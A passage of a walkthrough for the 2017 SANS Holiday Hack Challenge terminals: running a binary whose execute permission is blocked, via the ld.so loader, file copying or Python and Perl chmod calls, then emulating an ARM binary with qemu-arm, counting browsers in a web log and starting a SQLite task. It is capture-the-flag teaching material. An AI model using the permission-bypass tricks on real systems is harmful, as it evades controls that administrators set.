-rw-r--r-- 1 root root 45224 Dec 15 19:59 CandyCaneStriper
elf@784e43534178:~$ file CandyCaneStriper 
CandyCaneStriper: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=bfe4ffd88f30e6970feb7e3341ddbe579e9ab4b3, stripped
</pre>

<p>
Much like how Python and Perl scripts have interpreters, ELF binaries also have interpreters. For our target, <code>file</code> tells us that our interpreter is <code>/lib64/ld-linux-x86-64.so.2</code>.
</p>

<pre class="example">
elf@784e43534178:~$ /lib64/ld-linux-x86-64.so.2
Usage: ld.so [OPTION]... EXECUTABLE-FILE [ARGS-FOR-PROGRAM...]
You have invoked `ld.so', the helper program for shared library executables.
This program usually lives in the file `/lib/ld.so', and special directives
in executable files using ELF shared libraries tell the system's program
loader to load the helper program from this file.  This helper program loads
the shared libraries needed by the program executable, prepares the program
to run, and runs it.  You may invoke this helper program directly from the
command line to load and run an ELF executable file; this is like executing
that file itself, but always uses this helper program from the file you
specified, instead of the helper program file specified in the executable
file you run.  This is mostly of use for maintainers to test new versions
of this helper program; chances are you did not intend to run this program.
  --list                list all dependencies and how they are resolved
  --verify              verify that given object really is a dynamically linked
			object we can handle
  --inhibit-cache       Do not use /etc/ld.so.cache
  --library-path PATH   use given PATH instead of content of the environment
			variable LD_LIBRARY_PATH
  --inhibit-rpath LIST  ignore RUNPATH and RPATH information in object names
			in LIST
  --audit LIST          use objects named in LIST as auditors

elf@784e43534178:~$ /lib64/ld-linux-x86-64.so.2 ./CandyCaneStriper 
</pre>
</div>
</div>

<div id="outline-container-org42fd48f" class="outline-4">
<h4 id="cryokinetic_solution"><a id="org42fd48f"></a>Solution</h4>
<div class="outline-text-4" id="text-cryokinetic_solution">
<pre class="example">
elf@784e43534178:~$ /lib64/ld-linux-x86-64.so.2 ./CandyCaneStriper
		   _..._
		 .'\\ //`,      
		/\\.'``'.=",
	       / \/     ;==|
	      /\\/    .'\`,`
	     / \/     `""`
	    /\\/
	   /\\/
	  /\ /
	 /\\/
	/`\/
	\\/
	 `
The candy cane striping machine is up and running!
</pre>
</div>
</div>

<div id="outline-container-orgec7b449" class="outline-4">
<h4 id="cryokinetic_alternatives"><a id="orgec7b449"></a>Alternatives</h4>
<div class="outline-text-4" id="text-cryokinetic_alternatives">
<p>
There are <b>many</b> different ways to solve this challenge.
</p>

<p>
Overwrite an executable file with the existing binary:
</p>

<pre class="example">
elf@784e43534178:~$ ls -l /bin/chmod
-rwxr-xr-x 1 root root 0 Dec 15 20:00 /bin/chmod
elf@784e43534178:~$ cp /bin/ls new
elf@784e43534178:~$ cat CandyCaneStriper  &gt; new
elf@784e43534178:~$ ls -l
total 96
-rw-r--r-- 1 root root 45224 Dec 15 19:59 CandyCaneStriper
-rwxr-xr-x 1 elf  elf  45224 Dec 17 00:15 new
elf@784e43534178:~$ ./new
</pre>

<p>
Use python to chmod.  The chmod binary is just a wrapper around the
chmod libc function.  Any programming language will have this
available:
</p>

<div class="org-src-container">
<pre class="src src-python">&gt;&gt;&gt; <span style="color: #b5bd68;">import</span> os
&gt;&gt;&gt; os.chmod(<span style="color: #8abeb7;">"CandyCaneStriper"</span>, 0755)
Traceback (most recent call last):
  File <span style="color: #8abeb7;">"&lt;stdin&gt;"</span>, line 1, <span style="color: #b5bd68;">in</span> &lt;module&gt;
<span style="color: #81a2be;">OSError</span>: [Errno 1] Operation <span style="color: #b5bd68;">not</span> permitted: <span style="color: #8abeb7;">'CandyCaneStriper'</span>
</pre>
</div>

<p>
FAIL :(  For some reason we can't modify CandyCaneStriper.  What if make a copy first?
</p>

<pre class="example">
elf@784e43534178:~$ cp CandyCaneStriper c
elf@784e43534178:~$ python
Python 2.7.12 (default, Nov 20 2017, 18:23:56) 
[GCC 5.4.0 20160609] on linux2
Type "help", "copyright", "credits" or "license" for more information.
&gt;&gt;&gt; import os
&gt;&gt;&gt; os.chmod("c", 0755)
&gt;&gt;&gt; ^d
elf@784e43534178:~$ ./c
</pre>

<p>
With perl:
</p>

<pre class="example">
elf@784e43534178:~$ cp CandyCaneStriper c
elf@784e43534178:~$ cat &gt; fix.pl
chmod 0755 "c";
^d
elf@784e43534178:~$ perl fix.pl 
String found where operator expected at fix.pl line 1, near "0755 "c""
	(Missing operator before  "c"?)
syntax error at fix.pl line 1, near "0755 "c""
Execution of fix.pl aborted due to compilation errors.
elf@784e43534178:~$ cat &gt; fix.pl
chmod 0755, "c";
^d
elf@784e43534178:~$ perl fix.pl 
elf@784e43534178:~$ ./c
</pre>

<p>
Or as a perl one liner, now that we figured out the syntax:
</p>

<pre class="example">
elf@784e43534178:~$ cp CandyCaneStriper c
elf@784e43534178:~$ perl -e 'chmod 0755, "c"'
</pre>
</div>
</div>
</div>
<div id="outline-container-org7426979" class="outline-3">
<h3 id="org7426979">There's Snow Place Like Home</h3>
<div class="outline-text-3" id="text-org7426979">
</div>
<div id="outline-container-org6730125" class="outline-4">
<h4 id="home_question"><a id="org6730125"></a>Question</h4>
<div class="outline-text-4" id="text-home_question">
<pre class="example">

                             ______
                          .-"""".._'.       _,##
                   _..__ |.-"""-.|  |   _,##'`-._
                  (_____)||_____||  |_,##'`-._,##'`
                  _|   |.;-""-.  |  |#'`-._,##'`
               _.;_ `--' `\    \ |.'`\._,##'`
              /.-.\ `\     |.-";.`_, |##'`
              |\__/   | _..;__  |'-' /
              '.____.'_.-`)\--' /'-'`
               //||\\(_.-'_,'-'`
             (`-...-')_,##'`
      jgs _,##`-..,-;##`
       _,##'`-._,##'`
    _,##'`-._,##'`
      `-._,##'`
My name is Pepper Minstix, and I need your help with my plight.
I've crashed the Christmas toy train, for which I am quite contrite.
I should not have interfered, hacking it was foolish in hindsight.
If you can get it running again, I will reward you with a gift of delight.
</pre>
</div>
</div>

<div id="outline-container-orgbb0512d" class="outline-4">
<h4 id="home_how-to-find-the-terminal"><a id="orgbb0512d"></a>How to find the terminal</h4>
<div class="outline-text-4" id="text-home_how-to-find-the-terminal">
<p>
From this game: <a href="https://2017.holidayhackchallenge.com/game/41a1e6bb-60c3-4695-ad04-514fbcc76afa">https://2017.holidayhackchallenge.com/game/41a1e6bb-60c3-4695-ad04-514fbcc76afa</a>
</p>

<p>
Direct link: <a href="https://docker2017.holidayhackchallenge.com/?challenge=4050467e-9cde-44cd-aa63-1a0b8b210bb7&amp;uid=USER_ID">https://docker2017.holidayhackchallenge.com/?challenge=4050467e-9cde-44cd-aa63-1a0b8b210bb7&amp;uid=USER_ID</a>
</p>

<div class="org-center">
<iframe width="560" height="315" src="https://www.youtube-nocookie.com/embed/jdnzTyzyAPY?rel=0" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
</div>


<div class="figure">
<p><img src="./images/terminal-location-home.png" alt="terminal-location-home.png" />
</p>
<p><span class="figure-number">Figure 8: </span>The terminal is on the side of the center building.</p>
</div>
</div>
</div>

<div id="outline-container-org68feb05" class="outline-4">
<h4 id="home_background-information"><a id="org68feb05"></a>Background Information</h4>
<div class="outline-text-4" id="text-home_background-information">
<p>
We're logged in as the user elf. There's a file called <code>trainstartup</code> in our home directory.
</p>

<p>
This is a 64-bit x86 system:
</p>

<pre class="example">
elf@784e43534178:~$ uname -a
Linux 784e43534178 4.9.0-4-amd64 #1 SMP Debian 4.9.65-3 (2017-12-03) x86_64 x86_64 x86_64 GNU/Linux
</pre>
</div>
</div>

<div id="outline-container-org36bff77" class="outline-4">
<h4 id="home_goal"><a id="org36bff77"></a>Goal</h4>
<div class="outline-text-4" id="text-home_goal">
<p>
It looks like we just want to run the <code>trainstartup</code> file, but if we try that, we get an exec error:
</p>

<pre class="example">
elf@784e43534178:~$ ./trainstartup 
bash: ./trainstartup: cannot execute binary file: Exec format error
</pre>
</div>
</div>

<div id="outline-container-org589bf8a" class="outline-4">
<h4 id="home_hints"><a id="org589bf8a"></a>Hints</h4>
<div class="outline-text-4" id="text-home_hints">
<p>
Pepper Minstix on Twitter has a hint:
</p>
<blockquote class="twitter-tweet" data-lang="en"><p lang="en" dir="ltr">Actually, <a href="https://twitter.com/GreenesterElf?ref_src=twsrc%5Etfw">@GreenesterElf</a> , you&#39;re better at prompt commands than I am. Why can&#39;t I get this model train thing working? I&#39;m in the right directory like you taught me, but this system is still saying &quot;No such file or directory&quot;</p>&mdash; Pepper Minstix (@PepperyGoodness) <a href="https://twitter.com/PepperyGoodness/status/938545233624678400?ref_src=twsrc%5Etfw">December 6, 2017</a></blockquote>

<p>
Holly Evergreen on Twitter has a hint for this as well:
</p>
<blockquote class="twitter-tweet" data-lang="en"><p lang="en" dir="ltr">I still can&#39;t figure out Pepper Minstix&#39;s issue. It looks like the binary is compiled for another architecture. I think qemu can help, but I don&#39;t want to run the entire OS :\ <a href="https://t.co/pikSOOkyZe">https://t.co/pikSOOkyZe</a> helps, but I just want one binary, not the whole system!</p>&mdash; Holly Evergreen (@GreenesterElf) <a href="https://twitter.com/GreenesterElf/status/938552050253643777?ref_src=twsrc%5Etfw">December 6, 2017</a></blockquote>
</div>
</div>

<div id="outline-container-orgb2ac456" class="outline-4">
<h4 id="home_approach"><a id="orgb2ac456"></a>Approach</h4>
<div class="outline-text-4" id="text-home_approach">
<p>
There's really not much to go on here. We'll first use <code>file</code> to identify the <code>trainstartup</code> binary:
</p>

<pre class="example">
elf@784e43534178:~$ file trainstartup 
trainstartup: ELF 32-bit LSB  executable, ARM, EABI5 version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=005de4685e8563d10b3de3e0be7d6fdd7ed732eb, not stripped
</pre>

<p>
So the file is a Linux ELF binary, but it's for the ARM processor, and not for the x86_64 system that we're on. Let's see if there are any programs in our path that have <code>arm</code> in the file name:
</p>

<pre class="example">
elf@784e43534178:~$ compgen -c | grep arm
qemu-arm
qemu-armeb
</pre>

<p>
Running it with the help option gives us:
</p>

<pre class="example">
elf@784e43534178:~$ qemu-arm -h
usage: qemu-arm [options] program [arguments...]
Linux CPU emulator (compiled for arm emulation)
...
</pre>

<p>
This looks like exactly what we need. <code>qemu-arm</code> provides us with an ARM emulator, and we just need to run it with our program as the single argument. Let's give it a shot:
</p>

<pre class="example">
elf@784e43534178:~$ qemu-arm ./trainstartup 
Starting up ... 

    Merry Christmas
    Merry Christmas
v
&gt;*&lt;
^
/o\
/   \               @.·
/~~   \                .
/ ° ~~  \         ·      
/      ~~ \       ◆       
/     °   ~~\      .   0
/~~           \    ─· ─ · o
    ┌┐       /° ·~~  .*·   . \
     ▒▒▒\     │  ──┬─°─┬─°─°─°─
≠==≠°=≠°=≠==──┼──=≠     ≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠
	      │   /└───┘\┌───┐                                                 
			 └───┘                                                 
≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠



You did it! Thank you!
</pre>

<p>
Success!
</p>
</div>
</div>

<div id="outline-container-orgc234df5" class="outline-4">
<h4 id="home_solution"><a id="orgc234df5"></a>Solution</h4>
<div class="outline-text-4" id="text-home_solution">
<p>
You need to use <code>qemu-arm</code> to run the ARM binary: <code>qemu-arm ./trainstartup</code>
</p>
</div>
</div>

<div id="outline-container-orgdc90524" class="outline-4">
<h4 id="home_alternatives"><a id="orgdc90524"></a>Alternatives</h4>
<div class="outline-text-4" id="text-home_alternatives">
<p>
The real difficulty of this terminal was in discovering that you
needed to use <code>qemu-arm</code>. <code>compgen -c</code> is a handy trick in CTFs to
figure out what special programs are installed on a certain
system. Another useful trick is using find to see what changes were
made to the system after it was installed. Let's take a quick look at
<code>qemu=arm</code> and at another file we know was changed, <code>trainstartup</code>:
</p>

<pre class="example">
elf@784e43534178:~$ stat /usr/bin/qemu-arm trainstartup 
  File: '/usr/bin/qemu-arm'
  Size: 1725888         Blocks: 3376       IO Block: 4096   regular file
Device: 801h/2049d      Inode: 1049395     Links: 1
Access: (0755/-rwxr-xr-x)  Uid: (    0/    root)   Gid: (    0/    root)
Access: 2017-09-20 14:01:57.000000000 +0000
Modify: 2017-09-20 14:01:57.000000000 +0000
Change: 2017-12-06 20:01:07.719592650 +0000
 Birth: -
  File: 'trainstartup'
  Size: 454636          Blocks: 888        IO Block: 4096   regular file
Device: 801h/2049d      Inode: 1049511     Links: 1
Access: (0755/-rwxr-xr-x)  Uid: (    0/    root)   Gid: (    0/    root)
Access: 2017-12-07 18:43:55.000000000 +0000
Modify: 2017-12-07 18:43:55.000000000 +0000
Change: 2017-12-07 18:43:58.191037092 +0000
 Birth: -
</pre>

<p>
If we look at the change time (or <code>ctime</code>), we can see that this
system was setup around December 6th, with the status of
<code>trainstartup</code> being changed the next day. An important thing to
remember with <code>ctime</code> is that the file contents didn't change, but
some data in the file inode did (permissions, creation,
etc.). Normally, we might use something like the modification time,
but that doesn't work well for files installed from packages.
</p>

<p>
A common way to setup a system is to first add sources to the package
manager, then install any necessary packages, and make any additional
modifications to a system. Let's use <code>find</code> to see what files were
modified after <code>/etc/apt</code> was changed, and we'll look for files with
<code>arm</code> in the name:
</p>

<pre class="example">
elf@784e43534178:~$ find / -xdev -cnewer /etc/apt/sources.list | grep -w arm
/usr/bin/qemu-arm
/usr/share/man/man1/qemu-arm.1.gz
</pre>

<p>
In this case, I'm using <code>-xdev</code> to restrict the <code>find</code> to files on the
same device (thus excluding <code>/sys</code>, <code>/proc</code>, etc.).
</p>

<p>
If that still didn't work, here's a one-liner to sort the files on the
system according to when their <code>ctime</code> was modified. This would enable
you to see a complete timeline of changes to files:
</p>

<pre class="example">
elf@784e43534178:~$ find / -xdev -printf "%C+\t%p\n" | sort | head
2017-12-04+14:36:51.7363603170  /bin/bash
2017-12-04+14:36:51.7363603170  /bin/bunzip2
2017-12-04+14:36:51.7363603170  /bin/bzcat
2017-12-04+14:36:51.7363603170  /bin/bzcmp
2017-12-04+14:36:51.7363603170  /bin/bzdiff
2017-12-04+14:36:51.7363603170  /bin/bzegrep
...
</pre>
</div>
</div>

<div id="outline-container-org12b4fee" class="outline-4">
<h4 id="home_common-pitfalls"><a id="org12b4fee"></a>Common Pitfalls</h4>
<div class="outline-text-4" id="text-home_common-pitfalls">
<p>
This terminal was tricky because almost no information was
given. Knowing how to use <code>file</code> to identify that <code>trainstartup</code> was
an ARM binary, and knowing how to find <code>qemu-arm</code> was key.
</p>

<p>
If you simply google "cannot execute binary file: Exec format error" it will
lead you down a rabbit hole.  Normally, this error is caused by downloading a
binary for the wrong architecture and the fix is to simply re-download the
right binary.  In this case, we can't download a version of the binary built
for the correct architecture.  What we need to do is "Run arm binary on amd64".
Searching for this points us to using qemu as an emulator.
</p>
</div>
</div>
</div>
<div id="outline-container-orgcc00746" class="outline-3">
<h3 id="orgcc00746">Bumble's Bounce</h3>
<div class="outline-text-3" id="text-orgcc00746">
</div>
<div id="outline-container-orgeb6bd69" class="outline-4">
<h4 id="bounce_question"><a id="orgeb6bd69"></a>Question</h4>
<div class="outline-text-4" id="text-bounce_question">
<pre class="example">
                           ._    _.
                           (_)  (_)                  &lt;&gt; \  / &lt;&gt;
                            .\::/.                   \_\/  \/_/ 
           .:.          _.=._\\//_.=._                  \\//
      ..   \o/   ..      '=' //\\ '='             _&lt;&gt;_\_\&lt;&gt;/_/_&lt;&gt;_
      :o|   |   |o:         '/::\'                 &lt;&gt; / /&lt;&gt;\ \ &lt;&gt;
       ~ '. ' .' ~         (_)  (_)      _    _       _ //\\ _
           &gt;O&lt;             '      '     /_/  \_\     / /\  /\ \
       _ .' . '. _                        \\//       &lt;&gt; /  \ &lt;&gt;
      :o|   |   |o:                   /\_\\&gt;&lt;//_/\
      ''   /o\   ''     '.|  |.'      \/ //&gt;&lt;\\ \/
           ':'        . ~~\  /~~ .       _//\\_
jgs                   _\_._\/_._/_      \_\  /_/ 
                       / ' /\ ' \                   \o/
       o              ' __/  \__ '              _o/.:|:.\o_
  o    :    o         ' .'|  |'.                  .\:|:/.
    '.\'/.'                 .                 -=&gt;&gt;::&gt;o&lt;::&lt;&lt;=-
    :-&gt;@&lt;-:                 :                   _ '/:|:\' _
    .'/.\'.           '.___/*\___.'              o\':|:'/o 
  o    :    o           \* \ / */                   /o\
       o                 &gt;--X--&lt;
                        /*_/ \_*\
                      .'   \*/   '.
                            :
                            '
Minty Candycane here, I need your help straight away.
We're having an argument about browser popularity stray.
Use the supplied log file from our server in the North Pole.
Identifying the least-popular browser is your noteworthy goal.
</pre>
</div>
</div>

<div id="outline-container-org64c93d9" class="outline-4">
<h4 id="bounce_how-to-find-the-terminal"><a id="org64c93d9"></a>How to find the terminal</h4>
<div class="outline-text-4" id="text-bounce_how-to-find-the-terminal">
<p>
From this game: <a href="https://2017.holidayhackchallenge.com/game/dbb44df8-af5e-4136-b72e-ebd9dfb32b4a">https://2017.holidayhackchallenge.com/game/dbb44df8-af5e-4136-b72e-ebd9dfb32b4a</a>
</p>

<p>
Direct link: <a href="https://docker2017.holidayhackchallenge.com/?challenge=595aeb87-d3b2-41a3-b612-fa553a30e822&amp;uid=USER_ID">https://docker2017.holidayhackchallenge.com/?challenge=595aeb87-d3b2-41a3-b612-fa553a30e822&amp;uid=USER_ID</a>
</p>

<div class="org-center">
<iframe width="560" height="315" src="https://www.youtube-nocookie.com/embed/YbWnc5Wb0T8?rel=0" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
</div>


<div class="figure">
<p><img src="./images/terminal-location-bounce.png" alt="terminal-location-bounce.png" />
</p>
<p><span class="figure-number">Figure 9: </span>The terminal is located at the top of the right hand hill in the red circle. <a href="https://www.holidayhackchallenge.com/2017/pages/05c0cacc8cfb96bb5531540e9b2b839a0604225f/GreatBookPage5.pdf">GreatBookPage5.pdf</a> is on the same hill identified by the blue circle.</p>
</div>
</div>
</div>

<div id="outline-container-orgc920603" class="outline-4">
<h4 id="bounce_background-information"><a id="orgc920603"></a>Background Information</h4>
<div class="outline-text-4" id="text-bounce_background-information">
</div>
</div>

<div id="outline-container-org0f24947" class="outline-4">
<h4 id="bounce_goal"><a id="org0f24947"></a>Goal</h4>
<div class="outline-text-4" id="text-bounce_goal">
<p>
The goal is to analyze a 'log file' and determine what the least popular browser.
</p>
</div>
</div>

<div id="outline-container-orgfc8f644" class="outline-4">
<h4 id="bounce_hints"><a id="orgfc8f644"></a>Hints</h4>
<div class="outline-text-4" id="text-bounce_hints">
<p>
Minty Candycane on Twitter has some hints
</p>

<blockquote class="twitter-tweet" data-lang="en"><p lang="en" dir="ltr">Oh wow, <a href="https://twitter.com/Sw4mp_f0x?ref_src=twsrc%5Etfw">@Sw4mp_f0x</a> and <a href="https://twitter.com/bluscreenofjeff?ref_src=twsrc%5Etfw">@bluscreenofjeff</a> did a great job on this Parsing for Pentesters series! <a href="https://t.co/g1LcCWjH4Q">https://t.co/g1LcCWjH4Q</a></p>&mdash; Minty Candycane (@SirMintsALot) <a href="https://twitter.com/SirMintsALot/status/938188406546251777?ref_src=twsrc%5Etfw">December 5, 2017</a></blockquote>
<blockquote class="twitter-tweet" data-lang="en"><p lang="en" dir="ltr">The only thing that last article didn&#39;t really help me with was *counting* unique lines. This post looks super helpful for that! <a href="https://t.co/QaPQ4Ml0JD">https://t.co/QaPQ4Ml0JD</a> (it&#39;s even against web server logs, just the wrong field)</p>&mdash; Minty Candycane (@SirMintsALot) <a href="https://twitter.com/SirMintsALot/status/938574395240366080?ref_src=twsrc%5Etfw">December 7, 2017</a></blockquote>
</div>
</div>

<div id="outline-container-org822fccf" class="outline-4">
<h4 id="bounce_approach"><a id="org822fccf"></a>Approach</h4>
<div class="outline-text-4" id="text-bounce_approach">
<p>
A directory listing shows that terminal contains a binary called 'runtoanswer',
as well as fairly large 'access.log' file:
</p>

<pre class="example">
elf@784e43534178:~$ ls -lh
total 29M
-rw-r--r-- 1 root root  24M Dec  4 17:11 access.log
-rwxr-xr-x 1 root root 5.0M Dec 11 17:31 runtoanswer
elf@784e43534178:~$ wc -l access.log 
98655 access.log

elf@784e43534178:~$ head -n1 access.log 
XX.YY.66.201 - - [19/Nov/2017:06:50:30 -0500] "GET /robots.txt HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
</pre>

<p>
Seems we have a web log in the "Common Log Format", which as it turns out, used
to be called the "NCSA Common log format" when it was output by NCSA HTTPd in 1993
before that became apache.  It always struck me as an arbitrary log format..
Fields are separated by spaces, except for the date/time which is wrapped in
brackets.  Also except for the request which has the "method uri protocol"
quoted, and the user agent quoted as well.  Some fields are also hex encoded.  Anyway,
since we just want the user-agents, we can split the log lines on the double quote char.
</p>
</div>
</div>

<div id="outline-container-org852ce00" class="outline-4">
<h4 id="bounce_solution"><a id="org852ce00"></a>Solution</h4>
<div class="outline-text-4" id="text-bounce_solution">
<p>
My solution is to use the <code>cut</code> tool, along with <code>sort</code> and <code>uniq</code> to find the least popular browser.
<code>cut</code> is very limited compared to tools like <code>awk</code> or <code>sed</code>, but it is often simpler
to use.  We just need to grab the right field.  We can experiment on just the
first line using <code>head</code> and figure this out using trial and error:
</p>

<pre class="example">
elf@784e43534178:~$ head -n 1 access.log |cut -d '"' -f 4
-
elf@784e43534178:~$ head -n 1 access.log |cut -d '"' -f 5

elf@784e43534178:~$ head -n 1 access.log |cut -d '"' -f 6
Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)
</pre>

<p>
The 6th field is the user agent.  We also only want everything to the left of the first slash, so
different versions of the same browser are merged:
</p>

<pre class="example">
elf@784e43534178:~$ head -n 1 access.log |cut -d '"' -f 6|cut -d / -f 1
Mozilla
</pre>

<p>
Now that the browser is isolated, we can switch <code>head -n 1</code> with <code>cat</code>, and use the
standard <code>sort | uniq -c | sort -n</code> to grab a frequency:
</p>

<pre class="example">
elf@784e43534178:~$ cat access.log |cut -d '"' -f 6|cut -d / -f 1|sort|uniq -c|sort -n|tail -n 5
     33 slack
     34 Googlebot-Image
    143 -
    422 Slack-ImgProxy (+https:
  97896 Mozilla
</pre>

<p>
Oops.. I mixed up the ordering, need the first 5, not the last 5:
</p>

<pre class="example">
elf@784e43534178:~$ cat access.log |cut -d '"' -f 6|cut -d / -f 1|sort|uniq -c|sort -n|head -n 5
      1 Dillo
      2 (KHTML, like Gecko) Chrome
      2 Slackbot-LinkExpanding 1.0 (+https:
      2 Telesphoreo
      2 Twitter
</pre>

<p>
Looks like my favorite lightweight browser from 2001 is not very popular these days.
</p>

<p>
I can also confirm that the log file only has a single entry for this user-agent:
</p>

<pre class="example">
elf@784e43534178:~$ grep Dillo access.log 
XX.YY.54.139 - - [27/Nov/2017:19:41:49 -0500] "GET /invoker/JMXInvokerServlet HTTP/1.1" 301 185 "-" "Dillo/3.0.5"
</pre>
</div>
</div>

<div id="outline-container-org00f82a3" class="outline-4">
<h4 id="bounce_alternatives"><a id="org00f82a3"></a>Alternatives</h4>
<div class="outline-text-4" id="text-bounce_alternatives">
</div>
</div>

<div id="outline-container-org2fa7f7d" class="outline-4">
<h4 id="bounce_common-pitfalls"><a id="org2fa7f7d"></a>Common Pitfalls</h4>
<div class="outline-text-4" id="text-bounce_common-pitfalls">
<p>
The most common issue appeared to be the result of not normalizing the different browser versions.
If you count each VERSION of a browser as a separate program, you will get a result like:
</p>

<pre class="example">
elf@784e43534178:~$ cat access.log |cut -d '"' -f 6|sort|uniq  -c|sort -n|head -n 5
      1 Dillo/3.0.5
      1 Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36
      1 Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/604.3.5 (KHTML, like Gecko)
      1 Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1
      1 Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko
</pre>

<p>
or like:
</p>

<pre class="example">
elf@784e43534178:~$ cat access.log |cut -d '"' -f 6|cut -d ' ' -f 1|sort|uniq  -c|sort -n
      1 Dillo/3.0.5
      1 curl/7.35.0
</pre>
</div>
</div>
</div>
<div id="outline-container-org38bbc1f" class="outline-3">
<h3 id="org38bbc1f">I Don't Think We're In Kansas Anymore</h3>
<div class="outline-text-3" id="text-org38bbc1f">
</div>
<div id="outline-container-orgc8bf0bf" class="outline-4">
<h4 id="kansas_question"><a id="orgc8bf0bf"></a>Question</h4>
<div class="outline-text-4" id="text-kansas_question">
<pre class="example">
                       *
                      .~'
                     O'~..
                    ~'O'~..
                   ~'O'~..~'
                  O'~..~'O'~.
                 .~'O'~..~'O'~
                ..~'O'~..~'O'~.
               .~'O'~..~'O'~..~'
              O'~..~'O'~..~'O'~..
             ~'O'~..~'O'~..~'O'~..
            ~'O'~..~'O'~..~'O'~..~'
           O'~..~'O'~..~'O'~..~'O'~.
          .~'O'~..~'O'~..~'O'~..~'O'~
         ..~'O'~..~'O'~..~'O'~..~'O'~.
        .~'O'~..~'O'~..~'O'~..~'O'~..~'
       O'~..~'O'~..~'O'~..~'O'~..~'O'~..
      ~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..
     ~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'
    O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'O'~.
   .~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'O'~
  ..~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'O'~.
 .~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'
O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..

Sugarplum Mary is in a tizzy, we hope you can assist.
Christmas songs abound, with many likes in our midst.
The database is populated, ready for you to address.
Identify the song whose popularity is the best.
</pre>
</div>
</div>

<div id="outline-container-orgb02836c" class="outline-4">
<h4 id="kansas_how-to-find-the-terminal"><a id="orgb02836c"></a>How to find the terminal</h4>
<div class="outline-text-4" id="text-kansas_how-to-find-the-terminal">
<p>
From this game: <a href="https://2017.holidayhackchallenge.com/game/5bbfc970-71d2-4c9d-816c-25955536c168">https://2017.holidayhackchallenge.com/game/5bbfc970-71d2-4c9d-816c-25955536c168</a>
</p>

<p>
Direct link: <a href="https://docker2017.holidayhackchallenge.com/?challenge=ab13b9fc-6e7c-4477-a8a1-bca7b616b877&amp;uid=USER_ID">https://docker2017.holidayhackchallenge.com/?challenge=ab13b9fc-6e7c-4477-a8a1-bca7b616b877&amp;uid=USER_ID</a>
</p>

<div class="org-center">
<iframe width="560" height="315" src="https://www.youtube-nocookie.com/embed/Ex6NJiCcJe0?rel=0" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
</div>

<div class="tip">
<p>
This one's tricky. You can strip out the poppies in your browser, and then the terminal can easily be seen on the left side
</p>

</div>

<div class="org-center">
<iframe width="560" height="315" src="https://www.youtube-nocookie.com/embed/THNIj3Z14lE?rel=0" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
</div>


<div class="figure">
<p><img src="./images/terminal-location-kansas.png" alt="terminal-location-kansas.png" />
</p>
<p><span class="figure-number">Figure 10: </span>If you take away the poppies the terminal can easily be seen on the left hand side of the field.</p>
</div>
</div>
</div>

<div id="outline-container-org80fb3a8" class="outline-4">
<h4 id="kansas_background-information"><a id="org80fb3a8"></a>Background Information</h4>
<div class="outline-text-4" id="text-kansas_background-information">
<p>
When we login, we see we have two files of interest in our current
directory: <code>christmassongs.db</code> and <code>runtoanswer</code>.
</p>

<p>
If we try running <code>runtoanswer</code>, we see:
</p>

<pre class="example">
elf@784e43534178:~$ ./runtoanswer 
Starting up, please wait......
Enter the name of the song with the most likes:
</pre>

<p>
Blog Posts:
</p>

<p>
The SANS Pen-Test Blog had a post about essential SQL commands, which might be useful:
</p>

<blockquote>
<p>
Your Pokemon Guide for Essential SQL Pen Test Commands
  <a href="https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands">https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands</a>
</p>
</blockquote>
</div>
</div>

<div id="outline-container-orge7fdecb" class="outline-4">
<h4 id="kansas_goal"><a id="orge7fdecb"></a>Goal</h4>
<div class="outline-text-4" id="text-kansas_goal">
<p>
Determine which song in <code>christmassongs.db</code> has the most likes.
</p>
</div>
</div>

<div id="outline-container-org09ebc11" class="outline-4">
<h4 id="kansas_hints"><a id="org09ebc11"></a>Hints</h4>
<div class="outline-text-4" id="text-kansas_hints">
<p>
Sugarplum Mary on Twitter has a hint: 
</p>
<blockquote class="twitter-tweet" data-lang="en"><p lang="en" dir="ltr">Hey <a href="https://twitter.com/PepperyGoodness?ref_src=twsrc%5Etfw">@PepperyGoodness</a>, can you help me with an SQL problem I&#39;ve seen? I think I need to do GROUP BY, but I&#39;m not quite sure of the syntax.</p>&mdash; SugerPlum Mary (@ThePlumSweetest) <a href="https://twitter.com/ThePlumSweetest/status/941067133898833921?ref_src=twsrc%5Etfw">December 13, 2017</a></blockquote>
</div>
</div>

<div id="outline-container-orgf15ec7a" class="outline-4">
<h4 id="kansas_approach"><a id="orgf15ec7a"></a>Approach</h4>
<div class="outline-text-4" id="text-kansas_approach">
<p>
Let's see exactly what this "db" file is:
</p>

<pre class="example">
elf@784e43534178:~$ less christmassongs.db 
bash: less: command not found
elf@784e43534178:~$ more christmassongs.db 
SQLite format 3
...
</pre>

<p>
sqlite!  Ok!  Let's start up sqlite and change some output options
</p>

